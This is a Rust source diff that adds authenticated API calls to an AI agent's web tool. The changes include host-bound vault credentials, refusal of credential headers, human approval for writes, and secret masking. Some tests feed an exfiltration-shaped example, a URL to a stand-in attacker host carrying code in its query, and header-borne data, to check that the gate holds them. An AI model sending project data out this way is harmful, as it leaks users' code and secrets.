@@ -15,8 +15,8 @@ use std::time::Duration;
 use bytes::Bytes;
 use flottille_core::agent::GateMode;
 use flottille_core::approval::Kind;
-use http::{Request, StatusCode, header};
-use http_body_util::{BodyExt, Empty};
+use http::{HeaderName, HeaderValue, Method, Request, StatusCode, header};
+use http_body_util::{BodyExt, Either, Empty, Full};
 use hyper_util::rt::TokioIo;
 use serde::Deserialize;
 use serde_json::Value;
@@ -27,6 +27,7 @@ use url::{Host, Url};
 
 use crate::gate;
 use crate::mcp::{Outcome, arguments};
+use flottille_core::secrets;
 
 /// The text of a page the agent is given, at most: a result stays under 40,000 characters
 /// (`docs/reference/mcp.md` §4 rule 5), with room for its header and links.
@@ -92,6 +93,10 @@ const TEST_OPEN: &str = "FLOTTILLE_TEST_WEB_OPEN";
 const TEST_SEARCH: &str = "FLOTTILLE_TEST_WEB_SEARCH";
 const DUCKDUCKGO: &str = "https://html.duckduckgo.com/html/";
 
+/// The use a vault entry is read for by `web`: an entry bound to another is refused
+/// (`docs/vault.md`, "Bound to one use").
+const USE: &str = "web";
+
 #[derive(Deserialize)]
 #[serde(deny_unknown_fields)]
 struct Arguments {
@@ -100,12 +105,155 @@ struct Arguments {
     query: Option<String>,
     #[allow(dead_code)]
     why: Option<String>,
+    entry: Option<String>,
+    method: Option<String>,
+    body: Option<String>,
+    headers: Option<serde_json::Map<String, Value>>,
+    auth: Option<String>,
 }
 
-/// What a call asks, decoded and checked: a URL to read, or a query.
+/// What a call asks, decoded and checked: a URL to read, as a page or as a call of an API, or a
+/// query.
 enum Asked {
-    Read(Url),
+    Read(Url, Option<Api>),
     Search(String),
+}
+
+/// How a call of an API signs in with its vault entry.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Auth {
+    Basic,
+    Bearer,
+}
+
+/// What a read that calls an API asks beyond its URL: its answer is the status, the type and the
+/// body as they came.
+#[derive(Clone, Debug)]
+struct Api {
+    method: Method,
+    entry: Option<String>,
+    auth: Option<Auth>,
+    body: Option<String>,
+    /// The agent's own, checked: never a credential's nor one web sets itself.
+    headers: Vec<(HeaderName, HeaderValue)>,
+}
+
+impl Api {
+    /// A method that writes: to judge (`docs/tools.md`, "The web").
+    fn writes(&self) -> bool {
+        !matches!(self.method, Method::GET | Method::HEAD)
+    }
+}
+
+/// The headers that carry a credential: only the daemon sets one, from a vault entry.
+const CREDENTIAL_HEADERS: [HeaderName; 3] = [
+    header::AUTHORIZATION,
+    header::COOKIE,
+    header::PROXY_AUTHORIZATION,
+];
+/// The headers that frame the request, web's own.
+const FRAMING_HEADERS: [HeaderName; 6] = [
+    header::HOST,
+    header::CONTENT_LENGTH,
+    header::TRANSFER_ENCODING,
+    header::CONNECTION,
+    header::TE,
+    header::UPGRADE,
+];
+
+/// The call of an API a read asks, if it names an entry, a method, a body, headers or an auth.
+fn api_of(args: &Arguments) -> Result<Option<Api>, String> {
+    if args.entry.is_none()
+        && args.method.is_none()
+        && args.body.is_none()
+        && args.headers.is_none()
+        && args.auth.is_none()
+    {
+        return Ok(None);
+    }
+    let method = match args
+        .method
+        .as_deref()
+        .map(str::to_ascii_uppercase)
+        .as_deref()
+    {
+        None | Some("GET") => Method::GET,
+        Some("HEAD") => Method::HEAD,
+        Some("POST") => Method::POST,
+        Some("PUT") => Method::PUT,
+        Some("PATCH") => Method::PATCH,
+        Some("DELETE") => Method::DELETE,
+        Some(other) => {
+            return Err(format!(
+                "refused: web has no method {other:?}: its methods are GET, HEAD, POST, PUT, \
+                 PATCH and DELETE"
+            ));
+        }
+    };
+    let auth = match args.auth.as_deref() {
+        None => None,
+        Some("basic") => Some(Auth::Basic),
+        Some("bearer") => Some(Auth::Bearer),
+        Some(other) => {
+            return Err(format!(
+                "refused: web has no auth {other:?}: it is basic or bearer"
+            ));
+        }
+    };
+    if auth.is_some() && args.entry.is_none() {
+        return Err(
+            "refused: auth says how web signs in with entry, and this call names no entry".into(),
+        );
+    }
+    if let Some(body) = &args.body {
+        if !matches!(
+            method,
+            Method::POST | Method::PUT | Method::PATCH | Method::DELETE
+        ) {
+            return Err(format!(
+                "refused: a {method} sends no body: a body goes with POST, PUT, PATCH or DELETE"
+            ));
+        }
+        if body.chars().count() > LONGEST {
+            return Err(format!(
+                "refused: this body is longer than the {LONGEST} characters web sends"
+            ));
+        }
+    }
+    let mut headers = Vec::new();
+    for (name, value) in args.headers.iter().flatten() {
+        let Some(value) = value.as_str() else {
+            return Err(format!(
+                "refused: the {name} header is no text: each header's value is a string"
+            ));
+        };
+        let Ok(parsed) = HeaderName::from_bytes(name.as_bytes()) else {
+            return Err(format!("refused: {name:?} is no header name"));
+        };
+        if CREDENTIAL_HEADERS.contains(&parsed) {
+            return Err(format!(
+                "refused: web sends no {name} header of yours: a sign-in goes with entry, the \
+                 name of a vault entry, whose secret the daemon adds itself on the entry's host"
+            ));
+        }
+        if FRAMING_HEADERS.contains(&parsed) {
+            return Err(format!("refused: web sets the {name} header itself"));
+        }
+        let Ok(value) = HeaderValue::from_str(value) else {
+            return Err(format!(
+                "refused: the value of the {name} header is no header value: one line of \
+                 visible text"
+            ));
+        };
+        headers.push((parsed, value));
+    }
+    Ok(Some(Api {
+        method,
+        entry: args.entry.clone(),
+        auth,
+        body: args.body.clone(),
+        headers,
+    }))
 }
 
 fn asked(args: &Value) -> Result<Asked, String> {
@@ -114,6 +262,13 @@ fn asked(args: &Value) -> Result<Asked, String> {
         Err(Outcome::Invalid(why)) => return Err(why),
         Err(_) => unreachable!("arguments only refuse"),
     };
+    let api = api_of(&args)?;
+    if args.action == "search" && api.is_some() {
+        return Err(
+            "refused: web search takes no entry, method, body, headers nor auth: they go with read"
+                .into(),
+        );
+    }
     match (args.action.as_str(), args.url, args.query) {
         ("read", Some(url), None) => {
             if url.chars().count() > LONGEST {
@@ -121,7 +276,7 @@ fn asked(args: &Value) -> Result<Asked, String> {
                     "refused: this URL is longer than the {LONGEST} characters web reads"
                 ));
             }
-            checked(&url).map(Asked::Read)
+            checked(&url).map(|url| Asked::Read(url, api))
         }
         ("search", None, Some(query)) => {
             let query = query.trim();
@@ -166,7 +321,15 @@ pub enum Pass {
 /// refused; a URL the agent was shown passes, a link only until its site was read
 /// [`LINK_READS`] times through links, and one it built is to judge; a search is to judge only
 /// in Ask (`docs/tools.md`, "The web").
-pub fn verdict(args: &Value, pass: impl Fn(&Url) -> Pass, mode: GateMode) -> gate::Verdict {
+///
+/// A call of an API that writes, or that sends headers of the agent's (they carry out what they
+/// hold as a URL does), is to judge, its card `signed` saying who it writes as.
+pub fn verdict(
+    args: &Value,
+    pass: impl Fn(&Url) -> Pass,
+    mode: GateMode,
+    signed: Option<&Signed>,
+) -> gate::Verdict {
     let held = |why: &str| {
         gate::Verdict::Ask(gate::Ask {
             reasons: vec![why.to_owned()],
@@ -176,7 +339,10 @@ pub fn verdict(args: &Value, pass: impl Fn(&Url) -> Pass, mode: GateMode) -> gat
     };
     match asked(args) {
         Err(why) => gate::Verdict::Deny(why),
-        Ok(Asked::Read(url)) => match pass(&url) {
+        Ok(Asked::Read(url, Some(api))) if api.writes() || !api.headers.is_empty() => {
+            held(&card(&url, &api, signed))
+        }
+        Ok(Asked::Read(url, _)) => match pass(&url) {
             Pass::Free => gate::Verdict::Allow,
             Pass::Link(reads) if reads < LINK_READS => gate::Verdict::Allow,
             Pass::Link(_) => held(OFTEN),
@@ -189,7 +355,20 @@ pub fn verdict(args: &Value, pass: impl Fn(&Url) -> Pass, mode: GateMode) -> gat
 
 /// The gate's verdict on a call of the agent's, a link it lets through counted against its site
 /// for its whole tree.
-pub fn classify(daemon: &crate::daemon::Daemon, agent: &str, args: &Value) -> gate::Verdict {
+pub fn classify(
+    daemon: &crate::daemon::Daemon,
+    grant: &crate::mcp::Grant,
+    args: &Value,
+) -> gate::Verdict {
+    let agent = grant.agent.as_str();
+    // An entry that cannot sign this call in is refused before any card.
+    let signed = match asked(args) {
+        Ok(Asked::Read(url, Some(api))) => match signed(daemon, grant, &url, &api) {
+            Ok(signed) => signed,
+            Err(why) => return gate::Verdict::Deny(why),
+        },
+        _ => None,
+    };
     let root = crate::tree::root_of(daemon, agent);
     let said: HashSet<String> = daemon
         .read(|store| store.last_deliveries_of(&root, "user", MESSAGES_READ))
@@ -204,14 +383,169 @@ pub fn classify(daemon: &crate::daemon::Daemon, agent: &str, args: &Value) -> ga
         true => Pass::Free,
         false => seen.pass(agent, &root, url),
     };
-    let verdict = verdict(args, |url| pass(&seen, url), mode);
+    let verdict = verdict(args, |url| pass(&seen, url), mode, signed.as_ref());
     if verdict == gate::Verdict::Allow
-        && let Ok(Asked::Read(url)) = asked(args)
+        && let Ok(Asked::Read(url, _)) = asked(args)
         && let Pass::Link(_) = pass(&seen, &url)
     {
         seen.read_through_link(&root, &url);
     }
-    verdict
+    match verdict {
+        // The card shows what the agent wrote: masked.
+        gate::Verdict::Ask(mut ask) => {
+            for reason in &mut ask.reasons {
+                *reason = crate::mcp::masked(reason, &grant.place);
+            }
+            gate::Verdict::Ask(ask)
+        }
+        verdict => verdict,
+    }
+}
+
+/// The vault entry a call of an API signs in with, checked: what its card says and where its
+/// secret may go.
+pub struct Signed {
+    name: String,
+    username: Option<String>,
+    auth: Auth,
+    /// The host of the entry's `url`: the only one its secret goes to.
+    host: String,
+}
+
+/// The entry `api` names, if it may sign in at `url` for an agent of the grant's project, or the
+/// refusal that says why not: the project sees no entry of that name (and the agent may ask the
+/// user for it when none exists), it is bound to another use, it has no address a secret may go
+/// to, or `url` is not on its host.
+fn signed(
+    daemon: &crate::daemon::Daemon,
+    grant: &crate::mcp::Grant,
+    url: &Url,
+    api: &Api,
+) -> Result<Option<Signed>, String> {
+    let Some(name) = &api.entry else {
+        return Ok(None);
+    };
+    let nothing = "; nothing was sent";
+    let project = &grant.place.project;
+    let entries = daemon
+        .read(|store| store.vault_entries())
+        .map_err(|error| error.to_string())?;
+    let Some(entry) = entries
+        .iter()
+        .find(|entry| &entry.name == name && entry.seen_by(project))
+    else {
+        // A name another project's entry holds cannot be asked for.
+        let offer = match grant.tools.contains(&"vault")
+            && !entries.iter().any(|entry| &entry.name == name)
+        {
+            true => format!(
+                "; or ask the user for it, who types only the secret: vault {{action: \"ask\", \
+                 name: \"{name}\", why: \"<what you need it for>\", url: \"{}\"}}, answered at \
+                 once, the user's answer coming later as a delivery",
+                url.origin().ascii_serialization()
+            ),
+            false => String::new(),
+        };
+        return Err(format!(
+            "refused: the vault has no entry {name} for this project: the user adds it in \
+             Settings, Vault{offer}{nothing}"
+        ));
+    };
+    entry
+        .usable_for(USE)
+        .map_err(|why| format!("refused: {why}{nothing}"))?;
+    let Some(entry_url) = &entry.url else {
+        return Err(format!(
+            "refused: the vault entry {name} has no url, so it is bound to no host its secret may \
+             go to: the user sets its url in Settings, Vault{nothing}"
+        ));
+    };
+    let Some(host) = crate::extensions::site_of(entry_url) else {
+        return Err(format!(
+            "refused: the vault entry {name} is for {entry_url}, no web address a secret may go \
+             to: https, or http on this machine{nothing}"
+        ));
+    };
+    let asked = url.host_str().unwrap_or_default();
+    if asked != host {
+        return Err(format!(
+            "refused: the vault entry {name} is for {host}, and this URL is on {asked}: its \
+             secret goes only to {host}{nothing}"
+        ));
+    }
+    if crate::extensions::site_of(url.as_str()).is_none() {
+        return Err(format!(
+            "refused: this URL is plain http to {asked}, another machine: the secret of the vault \
+             entry {name} would travel in clear; use https{nothing}"
+        ));
+    }
+    let username = entry
+        .username
+        .as_deref()
+        .map(str::trim)
+        .filter(|username| !username.is_empty())
+        .map(str::to_owned);
+    let auth = match (api.auth, &username) {
+        (Some(Auth::Basic), None) => {
+            return Err(format!(
+                "refused: the vault entry {name} has no username, and basic sends one with the \
+                 secret: leave auth out to send it as a bearer token, or the user sets its \
+                 username in Settings, Vault{nothing}"
+            ));
+        }
+        (Some(auth), _) => auth,
+        (None, Some(_)) => Auth::Basic,
+        (None, None) => Auth::Bearer,
+    };
+    Ok(Some(Signed {
+        name: name.clone(),
+        username,
+        auth,
+        host,
+    }))
+}
+
+/// What the user reads of a call of an API before it is sent: the method, the URL, the host, who
+/// it signs in as, the agent's headers and the body.
+fn card(url: &Url, api: &Api, signed: Option<&Signed>) -> String {
+    let mut said = format!(
+        "it sends {} {url} to {}",
+        api.method,
+        url.host_str().unwrap_or_default()
+    );
+    match signed {
+        Some(Signed {
+            name,
+            username: Some(username),
+            auth: Auth::Basic,
+            ..
+        }) => said.push_str(&format!(" as {username} with the vault entry {name}")),
+        Some(signed) => said.push_str(&format!(
+            " with the vault entry {} as a bearer token",
+            signed.name
+        )),
+        None => {}
+    }
+    if !api.headers.is_empty() {
+        let headers: Vec<String> = api
+            .headers
+            .iter()
+            .map(|(name, value)| format!("{name}: {}", value.to_str().unwrap_or("?")))
+            .collect();
+        said.push_str(&format!(", its headers: {}", headers.join("; ")));
+        if !api.writes() {
+            said.push_str(
+                " (the agent wrote them, and they send out whatever they hold, as a URL does; \
+                 look for data carried out)",
+            );
+        }
+    }
+    match &api.body {
+        Some(body) => said.push_str(&format!(", its body: {body}")),
+        None if api.writes() => said.push_str(", with no body"),
+        None => {}
+    }
+    said
 }
 
 /// The URL as web reads it, or the refusal saying why it never can: `http` and `https` only, no
@@ -513,12 +847,14 @@ pub fn urls_in(text: &str) -> Vec<String> {
 /// Performs a call the gate let through.
 pub async fn web(
     daemon: &std::sync::Arc<crate::daemon::Daemon>,
-    agent: &str,
+    grant: &crate::mcp::Grant,
     args: Value,
 ) -> Outcome {
+    let agent = grant.agent.as_str();
     match asked(&args) {
         Err(why) => Outcome::Refused(why),
-        Ok(Asked::Read(url)) => {
+        Ok(Asked::Read(url, Some(api))) => call(daemon, grant, url, api).await,
+        Ok(Asked::Read(url, None)) => {
             let net = Net::of_env();
             match fetched(&net, url).await {
                 Err(outcome) => outcome,
@@ -550,10 +886,158 @@ pub async fn web(
     }
 }
 
+/// A call of an API the gate let through: its entry checked again and its secret read at the
+/// moment it is sent, its answer as it came, every form of the secret masked in it.
+async fn call(
+    daemon: &crate::daemon::Daemon,
+    grant: &crate::mcp::Grant,
+    url: Url,
+    api: Api,
+) -> Outcome {
+    use base64::Engine as _;
+    let signed = match signed(daemon, grant, &url, &api) {
+        Ok(signed) => signed,
+        Err(why) => return Outcome::Refused(why),
+    };
+    // The forms the secret travels in, the longest first, each masked in what comes back.
+    let mut masks = Vec::new();
+    let mut authorization = None;
+    if let Some(signed) = &signed {
+        let secret =
+            match crate::vault::secret(daemon, &grant.place.project, USE, &signed.name).await {
+                Ok(secret) => secret,
+                Err(why) => return Outcome::Refused(format!("refused: {why}; nothing was sent")),
+            };
+        let value = match signed.auth {
+            Auth::Basic => {
+                let credentials = base64::engine::general_purpose::STANDARD.encode(format!(
+                    "{}:{secret}",
+                    signed.username.as_deref().unwrap_or_default()
+                ));
+                let value = format!("Basic {credentials}");
+                masks.push(value.clone());
+                masks.push(credentials);
+                value
+            }
+            Auth::Bearer => {
+                let value = format!("Bearer {secret}");
+                masks.push(value.clone());
+                value
+            }
+        };
+        masks.push(secret);
+        authorization = Some(value);
+    }
+    let clean = |text: &str| {
+        let text = masks.iter().fold(text.to_owned(), |text, mask| {
+            text.replace(mask, secrets::MASK)
+        });
+        crate::mcp::masked(&text, &grant.place)
+    };
+    let mut authorization = match authorization.map(|value| HeaderValue::from_str(&value)) {
+        None => None,
+        Some(Ok(value)) => Some(value),
+        Some(Err(_)) => {
+            return Outcome::Refused(
+                "refused: the secret of this vault entry cannot go in a header; nothing was sent"
+                    .into(),
+            );
+        }
+    };
+    if let Some(value) = &mut authorization {
+        value.set_sensitive(true);
+    }
+    let sending = Sending {
+        method: api.method.clone(),
+        headers: api.headers.clone(),
+        body: api.body.clone(),
+        authorization,
+        host: signed.map(|signed| signed.host),
+    };
+    let net = Net::of_env();
+    let host = url.host_str().unwrap_or_default().to_owned();
+    match tokio::time::timeout(TOTAL, fetch_any(&net, url, &sending)).await {
+        Err(_) => Outcome::Failed(format!(
+            "{host} did not answer within {} seconds",
+            TOTAL.as_secs()
+        )),
+        Ok(Err(Missed::Refused(why))) => Outcome::Refused(clean(&why)),
+        Ok(Err(Missed::Failed(why))) => Outcome::Failed(clean(&why)),
+        Ok(Ok((status, page))) => Outcome::Done(clean(&api_answer(status, &page))),
+    }
+}
+
+/// A call of an API as the agent reads it: the status, the content type and the body as it came,
+/// inside the block of the web's text.
+fn api_answer(status: StatusCode, page: &Page) -> String {
+    let kind = match page.kind.trim() {
+        "" => "none",
+        kind => kind,
+    };
+    let mut head = format!(
+        "{UNTRUSTED}\nURL: {}\nStatus: {status}\nContent-Type: {kind}",
+        page.url
+    );
+    if let Some(location) = &page.location {
+        head.push_str(&format!("\nLocation: {}", one_line(location)));
+    }
+    let text = match std::str::from_utf8(&page.bytes) {
+        _ if page.bytes.is_empty() => String::new(),
+        Ok(text) => text.to_owned(),
+        Err(_) if matches!(kind_of(page), Ok(Body::Text | Body::Html)) => {
+            String::from_utf8_lossy(&page.bytes).into_owned()
+        }
+        Err(_) => format!(
+            "({} bytes of {kind}, not text: web shows a body that is text)",
+            page.bytes.len()
+        ),
+    };
+    let count = text.chars().count();
+    let shown_text = cut_at(&text, TEXT_CHARS);
+    // What the API answered is the web's: its URLs pass as links.
+    shown(&shown_text, Source::Link);
+    let mut answer = format!("{head}\n{OPEN}\n{}\n{CLOSE}", contained(&shown_text));
+    if count > TEXT_CHARS {
+        answer.push_str(&format!(
+            "\n(cut: the body has {count} characters, the first {TEXT_CHARS} are shown)"
+        ));
+    } else if page.cut {
+        answer.push_str(&format!(
+            "\n(cut: the body is over the {} MiB web downloads, its start is shown)",
+            DOWNLOAD_BYTES / 1024 / 1024
+        ));
+    }
+    answer
+}
+
+/// What a request sends: a page's read is a plain GET; a call of an API its method, the agent's
+/// headers, its body and the entry's sign-in, which goes only to `host`.
+struct Sending {
+    method: Method,
+    headers: Vec<(HeaderName, HeaderValue)>,
+    body: Option<String>,
+    authorization: Option<HeaderValue>,
+    host: Option<String>,
+}
+
+impl Sending {
+    fn read() -> Sending {
+        Sending {
+            method: Method::GET,
+            headers: Vec::new(),
+            body: None,
+            authorization: None,
+            host: None,
+        }
+    }
+}
+
 /// A page as it came back.
 struct Page {
     url: Url,
     kind: String,
+    /// Where a redirect that was not followed leads.
+    location: Option<String>,
     bytes: Vec<u8>,
     /// The download stopped at its cap.
     cut: bool,
@@ -1364,7 +1848,7 @@ async fn search(net: &Net, query: &str) -> Outcome {
         Ok(url) => url,
         Err(why) => return Outcome::Failed(format!("the search page is no URL: {why}")),
     };
-    let page = match tokio::time::timeout(TOTAL, fetch_any(net, url)).await {
+    let page = match tokio::time::timeout(TOTAL, fetch_any(net, url, &Sending::read())).await {
         Err(_) => {
             return Outcome::Failed(format!(
                 "{} did not answer within {} seconds",
@@ -1413,7 +1897,7 @@ fn contained_but_last(answer: &str) -> String {
 /// A page, its redirects followed: refused for an address that is not public; failed when its
 /// server answers an error.
 async fn fetch(net: &Net, url: Url) -> Result<Page, Missed> {
-    let (status, page) = fetch_any(net, url).await?;
+    let (status, page) = fetch_any(net, url, &Sending::read()).await?;
     if !status.is_success() {
         return Err(Missed::Failed(format!(
             "{} answered {status}: no page to read",
@@ -1423,15 +1907,33 @@ async fn fetch(net: &Net, url: Url) -> Result<Page, Missed> {
     Ok(page)
 }
 
-/// A page and its status, whatever it is, its redirects followed.
-async fn fetch_any(net: &Net, mut url: Url) -> Result<(StatusCode, Page), Missed> {
+/// A page and its status, whatever it is, its redirects followed: a write's are not (its answer
+/// is the redirect), and a sign-in's only on its host.
+async fn fetch_any(
+    net: &Net,
+    mut url: Url,
+    sending: &Sending,
+) -> Result<(StatusCode, Page), Missed> {
     for _ in 0..=REDIRECTS {
         let addresses = addresses(net, &url).await?;
-        let (status, location, page) = get(&url, &addresses).await?;
+        let (status, location, page) = get(&url, &addresses, sending).await?;
         let Some(location) = location.filter(|_| status.is_redirection()) else {
             return Ok((status, page));
         };
-        url = redirected(&url, &location, &net.open)?;
+        if !matches!(sending.method, Method::GET | Method::HEAD) {
+            return Ok((status, page));
+        }
+        let next = redirected(&url, &location, &net.open)?;
+        if let Some(host) = &sending.host
+            && next.host_str() != Some(host.as_str())
+        {
+            return Err(Missed::Refused(format!(
+                "refused: {url} redirects to {next}, on {}, and the vault entry's secret goes \
+                 only to {host}: web did not follow it",
+                next.host_str().unwrap_or_default()
+            )));
+        }
+        url = next;
     }
     Err(Missed::Failed(format!(
         "more than {REDIRECTS} redirects: web stopped following them"
@@ -1498,11 +2000,12 @@ async fn addresses(net: &Net, url: &Url) -> Result<Vec<SocketAddr>, Missed> {
 pub(crate) trait Io: AsyncRead + AsyncWrite + Unpin + Send {}
 impl<T: AsyncRead + AsyncWrite + Unpin + Send> Io for T {}
 
-/// One GET of the URL on one of its checked addresses: its status, where it redirects, and its
-/// body up to the download cap.
+/// One request of the URL on one of its checked addresses: its status, where it redirects, and
+/// its body up to the download cap.
 async fn get(
     url: &Url,
     addresses: &[SocketAddr],
+    sending: &Sending,
 ) -> Result<(StatusCode, Option<String>, Page), Missed> {
     let failed = |what: &str, error: &dyn std::fmt::Display| {
         Missed::Failed(format!(
@@ -1556,13 +2059,34 @@ async fn get(
         Some(port) => format!("{}:{port}", url.host_str().unwrap_or_default()),
         None => url.host_str().unwrap_or_default().to_owned(),
     };
-    let request = Request::get(&url[url::Position::BeforePath..url::Position::AfterQuery])
+    let body = match &sending.body {
+        None => Either::Left(Empty::<Bytes>::new()),
+        Some(body) => Either::Right(Full::new(Bytes::from(body.clone()))),
+    };
+    let mut request = Request::builder()
+        .method(sending.method.clone())
+        .uri(&url[url::Position::BeforePath..url::Position::AfterQuery])
         .header(header::HOST, host)
         .header(header::USER_AGENT, USER_AGENT)
         .header(header::ACCEPT, ACCEPT)
         .header(header::CONNECTION, "close")
-        .body(Empty::<Bytes>::new())
+        .body(body)
         .map_err(|e| failed("no request for", &e))?;
+    let headers = request.headers_mut();
+    if let Some(body) = &sending.body {
+        let kind = match serde_json::from_str::<Value>(body) {
+            Ok(_) => "application/json",
+            Err(_) => "text/plain; charset=utf-8",
+        };
+        headers.insert(header::CONTENT_TYPE, HeaderValue::from_static(kind));
+    }
+    // The agent's own replace web's defaults, never what frames the request or signs it in.
+    for (name, value) in &sending.headers {
+        headers.insert(name.clone(), value.clone());
+    }
+    if let Some(authorization) = &sending.authorization {
+        headers.insert(header::AUTHORIZATION, authorization.clone());
+    }
     let response = sender
         .send_request(request)
         .await
@@ -1599,6 +2123,7 @@ async fn get(
     let page = Page {
         url: url.clone(),
         kind,
+        location: location.clone(),
         bytes,
         cut,
     };
@@ -1756,6 +2281,55 @@ mod tests {
     }
 
     #[test]
+    fn a_write_or_a_get_with_the_agent_s_headers_is_judged_even_on_a_seen_url() {
+        let call = |more: Value| {
+            let mut args = json!({"action": "read", "url": "https://api.example/items"});
+            args.as_object_mut()
+                .unwrap()
+                .extend(more.as_object().unwrap().clone());
+            args
+        };
+        let judged = |args: &Value| match verdict(args, |_| Pass::Free, GateMode::Auto, None) {
+            gate::Verdict::Ask(ask) => {
+                assert_eq!(ask.class, gate::Class::Judge);
+                ask.reasons.join(" ")
+            }
+            other => panic!("{args}: {other:?}"),
+        };
+        let card = judged(&call(json!({"method": "DELETE"})));
+        assert_eq!(
+            card,
+            "it sends DELETE https://api.example/items to api.example, with no body"
+        );
+        let card = judged(&call(json!({"headers": {"X-Note": "fn main"}})));
+        assert!(card.contains("its headers: x-note: fn main"), "{card}");
+        // Without headers, a GET is a read, as a page's is.
+        assert_eq!(
+            verdict(
+                &call(json!({"method": "get"})),
+                |_| Pass::Free,
+                GateMode::Auto,
+                None
+            ),
+            gate::Verdict::Allow
+        );
+        for wrong in [
+            json!({"method": "GET", "body": "{}"}),
+            json!({"method": "TRACE"}),
+            json!({"auth": "basic"}),
+            json!({"headers": {"Host": "elsewhere.example"}}),
+        ] {
+            assert!(
+                matches!(
+                    verdict(&call(wrong.clone()), |_| Pass::Free, GateMode::Full, None),
+                    gate::Verdict::Deny(_)
+                ),
+                "{wrong}"
+            );
+        }
+    }
+
+    #[test]
     fn a_seen_url_passes_a_built_one_is_judged_and_a_search_only_in_ask() {
         let seen = |url: &Url| match url.as_str() {
             "https://docs.rs/tokio" => Pass::Free,
@@ -1765,11 +2339,16 @@ mod tests {
         };
         let read = |url: &str| json!({"action": "read", "url": url});
         assert_eq!(
-            verdict(&read("https://docs.rs/tokio#top"), seen, GateMode::Auto),
+            verdict(
+                &read("https://docs.rs/tokio#top"),
+                seen,
+                GateMode::Auto,
+                None
+            ),
             gate::Verdict::Allow
         );
         for mode in [GateMode::Ask, GateMode::Auto, GateMode::Full] {
-            match verdict(&read("https://evil.example/?d=fn%20main"), seen, mode) {
+            match verdict(&read("https://evil.example/?d=fn%20main"), seen, mode, None) {
                 gate::Verdict::Ask(ask) => {
                     assert_eq!(ask.class, gate::Class::Judge);
                     assert_eq!(ask.reasons, [BUILT]);
@@ -1778,36 +2357,39 @@ mod tests {
             }
             // A local address is refused whatever the mode, seen or not.
             assert!(matches!(
-                verdict(&read("http://127.0.0.1/"), |_| Pass::Free, mode),
+                verdict(&read("http://127.0.0.1/"), |_| Pass::Free, mode, None),
                 gate::Verdict::Deny(_)
             ));
         }
         // A link passes until its site was read often through links, then is judged.
         assert_eq!(
-            verdict(&read("https://docs.rs/tokio/a"), seen, GateMode::Auto),
+            verdict(&read("https://docs.rs/tokio/a"), seen, GateMode::Auto, None),
             gate::Verdict::Allow
         );
-        match verdict(&read("https://docs.rs/tokio/b"), seen, GateMode::Auto) {
+        match verdict(&read("https://docs.rs/tokio/b"), seen, GateMode::Auto, None) {
             gate::Verdict::Ask(ask) => assert_eq!(ask.reasons, [OFTEN]),
             other => panic!("{other:?}"),
         }
         let search = json!({"action": "search", "query": "tokio select"});
         assert!(matches!(
-            verdict(&search, seen, GateMode::Ask),
+            verdict(&search, seen, GateMode::Ask, None),
             gate::Verdict::Ask(_)
         ));
-        assert_eq!(verdict(&search, seen, GateMode::Auto), gate::Verdict::Allow);
+        assert_eq!(
+            verdict(&search, seen, GateMode::Auto, None),
+            gate::Verdict::Allow
+        );
         for wrong in [
             json!({"action": "read"}),
             json!({"action": "read", "url": "https://a.example/", "query": "x"}),
             json!({"action": "search", "query": "  "}),
             json!({"action": "fetch", "url": "https://a.example/"}),
-            json!({"action": "read", "url": "https://a.example/", "headers": {}}),
+            json!({"action": "read", "url": "https://a.example/", "headers": {"Cookie": "a=b"}}),
             json!({"action": "read", "url": format!("https://a.example/{}", "a".repeat(LONGEST))}),
         ] {
             assert!(
                 matches!(
-                    verdict(&wrong, seen, GateMode::Full),
+                    verdict(&wrong, seen, GateMode::Full, None),
                     gate::Verdict::Deny(_)
                 ),
                 "{wrong}"
@@ -2053,6 +2635,7 @@ mod tests {
         let page = Page {
             url: Url::parse(url).unwrap(),
             kind: String::new(),
+            location: None,
             bytes: bytes.to_vec(),
             cut: false,
         };
@@ -2194,6 +2777,7 @@ mod tests {
         let page = Page {
             url: Url::parse("https://docs.example/").unwrap(),
             kind: "text/html".into(),
+            location: None,
             bytes: b"<html></html>".to_vec(),
             cut: false,
         };
@@ -2225,6 +2809,7 @@ mod tests {
         let page = Page {
             url: Url::parse("https://docs.example/").unwrap(),
             kind: "text/html".into(),
+            location: None,
             bytes: b"<html></html>".to_vec(),
             cut: false,
         };
